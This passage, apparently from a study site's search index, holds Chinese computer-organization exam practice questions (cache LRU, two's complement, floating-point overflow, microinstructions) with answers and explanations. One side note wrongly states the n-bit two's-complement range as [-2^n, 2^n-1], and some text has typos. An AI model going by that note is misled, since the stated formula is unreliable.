\u548c\u4e3b\u5b58\u4e4b\u95f4\u4ea4\u6362\u7684\u5757\u5927\u5c0f\u4e3a1 \u4e2a\u5b57\u3002\u82e5Cache \u7684\u5185\u5bb9\u521d \u59cb\u4e3a\u7a7a\uff0c\u91c7\u75282 \u8def\u7ec4\u76f8\u8054\u6620\u5c04\u65b9\u5f0f\u548cLRU \u66ff\u6362\u7b97\u6cd5\uff0c\u5f53\u8bbf\u95ee\u7684\u4e3b\u5b58\u5730\u5740\u4f9d\u6b21\u4e3a0\uff0c4\uff0c8\uff0c2\uff0c0\uff0c6\uff0c8\uff0c6\uff0c4\uff0c8 \u65f6\uff0c\u547d\u4e2dCache \u7684\u6b21\u6570\u4e3a [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e1 B\uff0e2 C\uff0e3 D\uff0e4 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aCache \u67094 \u4e2a\u884c\uff0c2 \u8def\u7ec4\u76f8\u8054\uff0c\u5373Cache \u88ab\u5206\u62102 \u7ec4\uff0c\u6bcf\u7ec42 \u884c\u3002\u4e3b\u5b58\u5730\u5740\u4e3a0\uff5e1\u30014\uff5e5\u30018\uff5e9 \u53ef\u6620\u5c04\u5230\u7b2c0 \u7ec4Cache\u4e2d\uff0c\u4e3b\u5b58\u5730\u5740\u4e3a2\uff5e3\u30016\uff5e7 \u53ef\u6620\u5c04\u5230\u7b2c1 \u7ec4 Cache\u4e2d\u3002Cache \u521d\u59cb\u4e3a\u7a7a\uff0c\u91c7\u7528LRU \u66ff\u6362 \u7b97\u6cd5\uff0c\u5f53\u8bbf\u95ee\u4e3b\u5b58\u768410 \u4e2a\u5730\u5740\u4f9d\u6b21\u4e3a0\uff0c4\uff0c8\uff0c2\uff0c0\uff0c6\uff0c8\uff0c6\uff0c4\uff0c8 \u65f6\uff0c\u547d\u4e2dCache\u7684\u6b21\u6570\u5171\u67093 \u6b21\uff0c\u5206\u522b\u53d1 \u751f\u5728\u7b2c7\u30018 \u548c10 \u6b65\u65f6\u3002 \u6ce8\uff1a\u8ba1\u6570\u5668\u7684\u53d8\u5316\u89c4\u5219 \u547d\u4e2d\u65f6\uff0c\u6240\u547d\u4e2d\u7684\u884c\u7684\u8ba1\u6570\u5668\u6e05\u96f6\uff0c\u6bd4\u5176\u4f4e\u7684\u8ba1\u6570\u5668\u52a01\uff0c\u5176\u4f59\u4e0d\u53d8\u3002 \u672a\u547d\u4e2d\u4e14\u8fd8\u6709\u7a7a\u95f2\u884c\u65f6\uff0c\u65b0\u88c5\u5165\u7684\u884c\u7684\u8ba1\u6570\u5668\u7f6e0\uff0c\u5176\u4f59\u5168\u52a01\u3002 \u672a\u547d\u4e2d\u4e14\u65e0\u7a7a\u95f2\u884c\u65f6\uff0c\u8ba1\u6570\u503c\u4e3a3\u7684\u4fe1\u606f\u5757\u88ab\u6dd8\u6c70\uff0c\u65b0\u88c5\u5165\u7684\u5757\u7684\u8ba1\u6570\u5668\u7f6e0\uff0c\u5176\u4f59\u5168\u52a01\u3002","title":"1.3. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#14-sat","text":"\u5728\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0cCPU \u5185\u90e8\u5305\u62ec\u7a0b\u5e8f\u8ba1\u6570\u5668PC\u3001\u5b58\u50a8\u5668\u6570\u636e\u5bc4\u5b58\u5668MDR\u3001\u6307\u4ee4\u5bc4\u5b58\u5668IR \u548c\u5b58 \u50a8\u5668\u5730\u5740\u5bc4\u5b58\u5668MAR \u7b49\u3002\u82e5CPU \u8981\u6267\u884c\u7684\u6307\u4ee4\u4e3a\uff1aMOV R0 \uff0c100\uff08\u5373\u5c06\u6570\u503c100 \u4f20\u9001\u5230\u5bc4\u5b58\u5668R0 \u4e2d\uff09\uff0c\u5219CPU \u9996\u5148\u8981\u5b8c\u6210\u7684\u64cd\u4f5c\u662f \u3002[\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e100\u2192R0 B\uff0e100\u2192MDR C\uff0ePC\u2192MAR D\uff0ePC\u2192IR \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u65e0\u8bba\u8fd0\u884c\u4ec0\u4e48\u7c7b\u578b\u7684\u6307\u4ee4\uff0cCPU \u9996\u5148\u9700\u8981\u53d6\u6307\u4ee4\uff0c\u53d6\u6307\u4ee4\u9636\u6bb5\u7684\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u5c31\u662f\u5c06\u6307\u4ee4\u5730\u5740\uff08\u7a0b\u5e8f\u8ba1\u6570\u5668PC \u4e2d\u7684\u5185\u5bb9\uff09\u9001\u5f80\u5b58\u50a8\u5668\u5730\u5740\u5bc4\u5b58\u5668\u3002","title":"1.4. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#15-sun","text":"\u6d6e\u70b9\u6570\u52a0\u51cf\u8fd0\u7b97\u8fc7\u7a0b\u4e00\u822c\u5305\u62ec\u5bf9\u9636\u3001\u5c3e\u6570\u8fd0\u7b97\u3001\u89c4\u683c\u5316\u3001\u820d\u4eba\u548c\u5224\u65ad\u6ea2\u51fa\u7b49\u6b65\u9aa4\u3002\u8bbe\u6d6e\u70b9\u6570\u7684\u9636\u7801\u548c \u5c3e\u6570\u5747\u91c7\u7528\u8865\u7801\u8868\u793a\uff0c\u4e14\u4f4d\u6570\u5206\u522b\u4e3a5 \u4f4d\u548c7 \u4f4d\uff08\u5747\u542b2 \u4f4d\u7b26\u53f7\u4f4d\uff09\u3002\u82e5\u6709\u4e24\u4e2a\u6570X\uff1d2^7\u00d729/32\uff0cY\uff1d2^5\u00d75/8\uff0c \u5219\u7528\u6d6e\u70b9\u52a0\u6cd5\u8ba1\u7b97X\uff0bY \u7684\u6700\u7ec8\u7ed3\u679c\u662f \u3002[\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e001111100010 B\uff0e001110100010 C\uff0e010000010001 D\uff0e\u53d1\u751f\u6ea2\u51fa \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6839\u636e\u9898\u610f\uff0cX \u53ef\u8bb0\u4e3a00,111;00,11101\uff08\u5206\u53f7\u524d\u4e3a\u9636\u7801\uff0c\u5206\u53f7\u540e\u4e3a\u5c3e\u6570\uff09 \uff0cY \u53ef\u8bb0\u4e3a00,101;00,10100\uff1b\u9996\u5148\u5bf9\u9636\uff0cX\u3001Y \u9636\u7801\u76f8\u51cf\uff0c\u537300,111 \u4e0000,101\uff1d00,111\uff0b11,011\uff1d00,010\uff08\u6700\u9ad8\u4f4d\u8fdb\u4f4d\u81ea\u7136\u4e22\u5f03\uff09 \uff0c\u53ef\u77e5X \u7684\u9636 \u7801\u6bd4Y \u7684\u9636\u7801\u59272\uff0c\u6839\u636e\u5c0f\u9636\u5411\u5927\u9636\u770b\u9f50\u7684\u539f\u5219\uff0c\u5c06Y \u7684\u9636\u7801\u52a02\uff0c\u5c3e\u6570\u53f3\u79fb2 \u4f4d\uff0c\u5f97Y \u4e3a00,111;00,00101\uff1b\u5c3e\u6570\u76f8\u52a0\uff0c\u537300,11101\uff0b00,00101\uff1d01,00010\uff0c\u5c3e\u6570\u76f8\u52a0\u7ed3\u679c\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u6545\u9700\u8fdb\u884c\u53f3\u89c4\uff1b\u89c4\u683c\u5316\uff0c\u5c06\u5c3e\u6570\u53f3\u79fb1 \u4f4d\uff0c\u9636\u7801\u52a01\uff0c\u5f97X\uff0bY \u4e3a01,000;00,10001 \uff0c\u9636\u7801\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u8bf4\u660e\u53d1\u751f\u6ea2\u51fa\u3002","title":"1.5. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#21-mon","text":"\u82e5x\uff1d103\uff0cy\uff1d\uff0d25\uff0c\u5219\u4e0b\u5217\u8868\u8fbe\u5f0f\u91c7\u75288 \u4f4d\u5b9a\u70b9\u8865\u7801\u8fd0\u7b97\u5b9e\u73b0\u65f6\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa\u7684\u662f [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0ex\uff0by B\uff0e\uff0dx\uff0by C\uff0ex\uff0dy D\uff0e\uff0dx\uff0dy \u6ce8\uff1a n \u4f4d\u8865\u7801\u5b9a\u70b9\u6574\u6570\u8868\u793a\u8303\u56f4\u4e3a [-2^n, 2^n-1] \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a8\u4f4d\u5b9a\u70b9\u8865\u7801\u80fd\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\u4e3a\uff1a\uff0d128\uff5e127\u3002A \u9879\uff0c\u7ed3\u679c\u4e3a78\uff0cB \u9879\uff0c\u7ed3\u679c\u4e3a\uff0d128\uff0cD \u9879\uff0c \u7ed3\u679c\u4e3a\uff0d78 \u90fd\u5728\u6b64\u8303\u56f4\u5185\u3002C \u9879\uff0c\u7ed3\u679c128 \u8d85\u8fc7\u4e868 \u4f4d\u5b9a\u70b9\u8865\u7801\u80fd\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002","title":"2.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#22-tue","text":"\u75313 \u4e2a\u201c1\u201d\u548c5 \u4e2a\u201c 0\u201d\u7ec4\u6210\u76848 \u4f4d\u4e8c\u8fdb\u5236\u8865\u7801\uff0c\u80fd\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\u662f [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e\uff0d126 B\uff0e\uff0d125 C\uff0e\uff0d32 D\uff0e\uff0d3 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u80fd\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\u4e00\u5b9a\u662f\u8d1f\u6570\uff0c\u7b26\u53f7\u4f4d\u5360\u75281 \u4e2a\u201c1\u201d\uff1b\u8d1f\u6570\u7684\u8865\u7801\u548c\u539f\u7801\u7684\u8f6c\u5316\u662f\uff1a\u539f\u7801\u7b26\u53f7\u4f4d\u4e0d \u53d8\uff0c\u6570\u503c\u90e8\u5206\u6309\u4f4d\u53d6\u53cd\uff0c\u672b\u4f4d\u52a0\u201c 1\u201d\u3002\u56e0\u6b64\u6700\u5c0f\u7684\u6574\u6570\u7684\u8865\u7801\u662f\u201c 10000011\u201d\uff0c\u539f\u7801\u4e3a\u201c 11111101\u201d\uff0c\u5373(\uff0d125)\u3002","title":"2.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#23-wed","text":"\u8bbe\u5728\u7f51\u7edc\u4e2d\u4f20\u9001\u91c7\u7528\u5076\u6821\u9a8c\u7684ASCII \u7801\uff0c\u5f53\u6536\u5230\u7684\u6570\u636e\u4f4d\u4e3a1101 0100 \u65f6\uff0c\u53ef\u4ee5\u65ad\u5b9a [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e\u672a\u51fa\u9519 B\uff0e\u51fa\u73b0\u5076\u6570\u4f4d\u9519 C\uff0e\u672a\u51fa\u9519\u6216\u51fa\u73b0\u5076\u6570\u4f4d\u9519 D\uff0e\u51fa\u73b0\u5947\u6570\u4f4d\u9519 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e00\u4f4d\u5947\u5076\u6821\u9a8c\u7801\u53ea\u80fd\u53d1\u73b0\u5947\u6570\u4f4d\u9519\u8bef\u3002\u672c\u9898\u4e2d\uff0c\u6536\u5230\u7684\u6570\u636e\u4e2d\u6709\u5076\u6570\u4e2a1\uff0c\u8fd9\u6837\u53ef\u80fd\u6ca1\u6709\u51fa\u9519\uff0c\u4e5f\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u5076\u6570\u4f4d\u9519\u8bef\uff08\u5947\u5076\u6821\u9a8c\u7801\u65e0\u6cd5\u53d1\u73b0\u5076\u6570\u4f4d\u9519\uff09\u3002","title":"2.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#24-thu","text":"\u82e5[x] \u8865\uff1d (1 x_1 x_2 x_3 x_4 x_5 x_6)_B \uff0c\u5176\u4e2d x_i \u53d6 0 \u62161\uff0c\u82e5\u8981 x > -32 \uff0c\u5e94\u5f53\u6ee1\u8db3 \u3002 [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0ex1\u4e3a0\uff0c\u5176\u4ed6\u5404\u4f4d\u4efb\u610f B\uff0ex1 \u4e3a1\uff0c\u5176\u4ed6\u5404\u4f4d\u4efb\u610f C\uff0ex1 \u4e3a1\uff0cx2,x6\u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1 D\uff0ex1\u4e3a0 , x2,x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a[x]\u8865\u7684\u7b26\u53f7\u4f4d\u4e3a1\uff0c\u6240\u4ee5x \u4e00\u5b9a\u662f\u8d1f\u6570\u3002\u7edd\u5bf9\u503c\u8d8a\u5c0f\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u6240\u4ee5\uff0c\u8981\u6ee1\u8db3x\uff1e\uff0d32\uff0c\u5219x \u7684 \u7edd\u5bf9\u503c\u5fc5\u987b\u5c0f\u4e8e32\u3002\u56e0\u6b64\uff0cx1\u4e3a1\uff0cx2, x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1\uff0c\u8fd9\u6837\uff0c\u5404\u4f4d\u53d6\u53cd\u672b\u5c3e\u52a01 \u540e\uff0cx1 \u4e00\u5b9a\u4e3a0\uff0cx2, x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1\uff0c\u8fd9\u4f7f\u5f97x \u7684\u7edd\u5bf9\u503c\u4fdd\u8bc1\u5c0f\u4e8e32\u3002","title":"2.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#25-fri","text":"\u67d0\u8ba1\u7b97\u673a\u670916 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u91c7\u752832 \u4f4d\u5b9a\u957f\u6307\u4ee4\u5b57\u3002\u64cd\u4f5c\u7801\u5b57\u6bb5\uff08\u542b\u5bfb\u5740\u65b9\u5f0f\u4f4d\uff09\u4e3a8 \u4f4d\uff0cStore \u6307\u4ee4\u7684 \u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u5206\u522b\u91c7\u7528\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u548c\u57fa\u5740\u5bfb\u5740\u65b9\u5f0f\uff0c\u82e5\u57fa\u5740\u5bc4\u5b58\u5668\u53ef\u4f7f\u7528\u4efb\u4e00\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u4e14\u504f\u79fb\u91cf\u7528\u8865\u7801\u8868\u793a\uff0c\u5219Store \u6307\u4ee4\u4e2d\u504f\u79fb\u91cf\u7684\u53d6\u503c\u8303\u56f4\u662f \u3002 [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\uff0d32768\uff5e\uff0b32767 B\uff0e\uff0d32767\uff5e\uff0b32768 C\uff0e\uff0d65536\uff5e\uff0b65535 D\uff0e\uff0d65535\uff5e\uff0b65536 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u91c7\u752832\u4f4d\u5b9a\u957f\u6307\u4ee4\u5b57\uff0c\u5176\u4e2d\u64cd\u4f5c\u7801\u4e3a8\u4f4d\uff0c\u4e24\u4e2a\u5730\u5740\u7801\u5171\u5360\u7528 32-8=24 \u4f4d\uff0c\u800c Store \u6307\u4ee4\u7684\u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u5206\u522b\u91c7\u7528\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u548c\u57fa\u5740\u5bfb\u5740\uff0c\u673a\u5668\u4e2d\u5171\u670916\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u4e00\u4e2a\u5bc4\u5b58\u5668\u9700\u8981log2(16)=4\u4f4d\uff0c\u6e90\u64cd\u4f5c\u6570\u4e2d\u7684\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u7528\u63894\u4f4d\uff0c\u800c\u76ee\u7684\u64cd\u4f5c\u6570\u91c7\u7528\u57fa\u5740\u5bfb\u5740\u4e5f\u8981\u6307\u5b9a\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u540c\u6837\u7528\u63894\u4f4d\uff0c\u5219\u7559\u7ed9\u504f\u79fb\u5740\u7684\u4f4d\u6570\u4e3a16\u4f4d\u3002\u6307\u4ee4\u7f16\u5740\u65b9\u5f0f\u5982\u4e0b\u6240\u793a 16 \u4f4d\u8865\u7801\u53d6\u503c\u8303\u56f4\u4e3a\uff0d32768\uff5e\uff0b32767\uff0c\u6240\u4ee5\u504f\u79fb\u91cf\u53d6\u503c\u8303\u56f4\u4e3a\uff0d32768\uff5e\uff0b32767\u3002","title":"2.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#26-sat","text":"\u67d0\u8ba1\u7b97\u673a\u7684\u63a7\u5236\u5668\u91c7\u7528\u5fae\u7a0b\u5e8f\u63a7\u5236\u65b9\u5f0f\uff0c \u5fae\u6307\u4ee4\u4e2d\u7684\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u91c7\u7528\u5b57\u6bb5\u76f4\u63a5\u7f16\u7801\u6cd5\uff0c \u5171\u670933\u4e2a\u5fae\u547d \u4ee4\uff0c\u6784\u62105 \u4e2a\u4e92\u65a5\u7c7b\uff0c\u5206\u522b\u5305\u542b7\u30013\u300112\u30015 \u548c6 \u4e2a\u5fae\u547d\u4ee4\uff0c\u5219\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u81f3\u5c11\u6709 \u3002 [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e5 \u4f4d B\uff0e6 \u4f4d C\uff0e15 \u4f4d D\uff0e33 \u4f4d \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a33 \u4e2a\u5fae\u547d\u4ee4\u5206\u62105 \u4e2a\u4e92\u65a5\u7c7b\uff08\u53735 \u4e2a\u5b57\u6bb5\uff09\uff0c\u6839\u636e\u6bcf\u4e2a\u7c7b\u4e2d\u5fae\u547d\u4ee4\u7684\u591a\u5c11\u53ef\u4ee5\u5206\u522b\u786e\u5b9a\u5b57\u6bb5\u7684\u957f\u5ea6 \u4e3a3\u30012\u30014\u30013\u30013 \u4f4d\uff0c\u53c8\u56e0\u4e3a\u91c7\u7528\u76f4\u63a5\u7f16\u7801\u65b9\u5f0f\uff0c \u6240\u4ee5\u5b83\u4eec\u4e4b\u548c3\uff0b2\uff0b4\uff0b3\uff0b3\uff1d15 \u4e5f\u5c31\u662f\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u7684\u4f4d\u6570\u3002","title":"2.6. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#27-sun","text":"\u5728\u8865\u7801\u8868\u793a\u7684\u673a\u5668\u4e2d\uff0c\u82e5\u5bc4\u5b58\u5668 A \u4e2d\u539f\u5b58\u7684\u6570\u4e3a (9E)_H \uff0c\u73b0\u5b58\u7684\u6570\u4e3a (CF)_H \uff0c\u5219\u8868\u660e\u6267\u884c\u7684\u4e00\u6761\u6307\u4ee4\u662f\u3002 [\u56fd\u9632\u79d1\u6280\u5927\u5b66] A\uff0e\u7b97\u672f\u5de6\u79fb B\uff0e\u903b\u8f91\u5de6\u79fb C\uff0e\u7b97\u672f\u53f3\u79fb D\uff0e\u903b\u8f91\u53f3\u79fb \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5bc4\u5b58\u5668A \u4e2d\u539f\u5b58\u5185\u5bb910011110\uff0c\u73b0\u5b58\u5185\u5bb911001111\uff0c\u8bf4\u660e\u6267\u884c\u4e86\u4e00\u6761\u7b97\u672f\u53f3\u79fb\u6307\u4ee4\u3002","title":"2.7. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Otc # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1 1. Week 1 # \u5782\u76f4\u578b\u5fae\u6307\u4ee4\u7684\u7279\u70b9\u662f \u3002[\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A. \u5fae\u6307\u4ee4\u683c\u5f0f\u5782\u76f4\u8868\u793a B. \u63a7\u5236\u4fe1\u53f7\u7ecf\u8fc7\u7f16\u7801 C. \u91c7\u7528\u5fae\u64cd\u4f5c\u7801 D. \u591a\u5c42\u6b21\u8868\u793a \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5782\u76f4\u578b\u5fae\u6307\u4ee4\u5fae\u6307\u4ee4\u4e2d\u8bbe\u7f6e\u5fae\u64cd\u4f5c\u7801\u5b57\u6bb5\uff0c\u91c7\u7528\u5fae\u64cd\u4f5c\u7801\u7f16\u8bd1\u6cd5\uff0c\u7531\u5fae\u64cd\u4f5c\u7801\u89c4\u5b9a\u5fae\u6307\u4ee4\u7684\u529f\u80fd\uff0c\u79f0\u4e3a\u5782\u76f4\u578b\u5fae\u6307\u4ee4","title":"2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#2020-otc","text":"","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#_1","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#1-week-1","text":"\u5782\u76f4\u578b\u5fae\u6307\u4ee4\u7684\u7279\u70b9\u662f \u3002[\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A. \u5fae\u6307\u4ee4\u683c\u5f0f\u5782\u76f4\u8868\u793a B. \u63a7\u5236\u4fe1\u53f7\u7ecf\u8fc7\u7f16\u7801 C. \u91c7\u7528\u5fae\u64cd\u4f5c\u7801 D. \u591a\u5c42\u6b21\u8868\u793a \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5782\u76f4\u578b\u5fae\u6307\u4ee4\u5fae\u6307\u4ee4\u4e2d\u8bbe\u7f6e\u5fae\u64cd\u4f5c\u7801\u5b57\u6bb5\uff0c\u91c7\u7528\u5fae\u64cd\u4f5c\u7801\u7f16\u8bd1\u6cd5\uff0c\u7531\u5fae\u64cd\u4f5c\u7801\u89c4\u5b9a\u5fae\u6307\u4ee4\u7684\u529f\u80fd\uff0c\u79f0\u4e3a\u5782\u76f4\u578b\u5fae\u6307\u4ee4","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Sep # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun 1. Week 3 # 1.1. Wed # \u4e24\u4e2a\u91c7\u7528\u53d8\u578b\u8865\u7801\u8868\u793a\u7684\u6570\u8fdb\u884c\u52a0\u51cf\u8fd0\u7b97\u65f6\uff0c\u53d1\u751f\u8d1f\u6ea2\u51fa\u7684\u7279\u5f81\u662f\u53cc\u7b26\u53f7\u4f4d\u4e3a [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\uff0e01 B\uff0e00 C\uff0e10 D\uff0e11 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a00\uff0c \u8868\u793a\u7ed3\u679c\u4e3a\u6b63\u6570\uff0c\u65e0\u6ea2\u51fa\uff1b \u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a11\uff0c\u8868\u793a\u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u65e0\u6ea2\u51fa\uff1b \u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a10\uff0c\u8868\u793a\u8d1f\u6ea2\u51fa\u3002 \u5f53\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u8868\u793a\u6b63\u6ea2\u51fa 1.2. Wed # \u5728\u53d6\u6307\u4ee4\u64cd\u4f5c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668PC\u5b58\u653e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\u3001\u5f53\u524d\u6307\u4ee4\u7684\u5730\u5740 B\u3001\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 C\u3001\u4e0a\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 D\u3001\u7a0b\u5e8f\u4e2d\u6307\u4ee4\u7684\u6570\u91cf \u7b54\u6848 \u7b54\u6848\uff1aB 